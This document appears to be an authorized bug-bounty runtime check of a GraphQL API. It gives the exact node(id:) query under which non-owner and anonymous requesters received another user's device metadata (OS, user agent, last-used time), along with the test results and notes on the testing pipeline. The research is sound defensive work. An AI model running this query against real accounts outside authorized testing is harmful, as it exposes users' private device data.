# Runtime Check: CAP-C `UserDevice` via `node(id:)`

## Scope

Read-only comparison using two authorized HackerOne test accounts and an
anonymous control.

- Owner: Identity B (`trnhtinthnh`)
- Non-owner: Identity A (`phmgiahuy`)
- Seed source: Identity B browser-session `currentUser.currentDevice`
- Seed type: `UserDevice`
- Endpoint: `https://api.sorare.com/graphql`
- JWT audience: `pentest`

Raw local responses:

```text
/tmp/cap_c_owner_b.json
/tmp/cap_c_nonowner_a.json
/tmp/cap_c_anonymous.json
```

## Candidate Query

```graphql
query UserDeviceByGlobalId($id: ID!) {
  node(id: $id) {
    __typename
    id
    ... on UserDevice {
      deviceType
      os
      userAgent
      lastUsedAt
    }
  }
}
```

## Observed Matrix

| Requester | GraphQL errors | `__typename` | Object returned | Field masking |
| --- | ---: | --- | --- | --- |
| Owner B | 0 | `UserDevice` | Yes | None |
| Non-owner A | 0 | `UserDevice` | Yes | None |
| Anonymous | 0 | `UserDevice` | Yes | None |

All three responses returned the same values for:

- `id`
- `deviceType`
- `os`
- `userAgent`
- `lastUsedAt`

Canonical `.data.node` SHA-256 for all three responses:

```text
f3f9c16d9cc03d62bfafcd1cad5763556419a7673e456909f07f299ff98aa0c2
```

## Runtime Artifact

```json
{
  "cap_id": "user-device:node",
  "sink": "UserDevice",
  "entry": "Query.node",
  "selector": {"name":"id", "type":"ID!"},
  "seed_owner": "identity-b",
  "observations": {
    "owner": {"object_returned":true, "errors":0, "masked_fields":[]},
    "non_owner": {"object_returned":true, "errors":0, "masked_fields":[]},
    "anonymous": {"object_returned":true, "errors":0, "masked_fields":[]}
  },
  "response_equivalence": {
    "owner_equals_non_owner": true,
    "owner_equals_anonymous": true
  },
  "runtime_status": "strong-bac-suspect",
  "confirmation_gate": "establish expected visibility policy for UserDevice"
}
```

## Interpretation

The static CAP was executable and the global-ID path bypassed the self-scoped
`currentUser` traversal. A non-owner and an anonymous requester received the
same complete device metadata as the owner.

This is a concrete access-control discrepancy and a strong information
disclosure/BAC suspect. Final vulnerability classification still requires the
expected product policy: whether `UserDevice` metadata is intentionally public.

## Pipeline Feedback

This run validates the following design decisions:

1. `globally_addressable` must create an independent CAP.
2. Interface expansion through `TYPE_CONDITION` is required.
3. A self-scoped traversal must not suppress the global-ID track.
4. Runtime needs an explicit seed acquisition step.
5. Owner/non-owner/anonymous response equivalence is a useful diff-oracle.
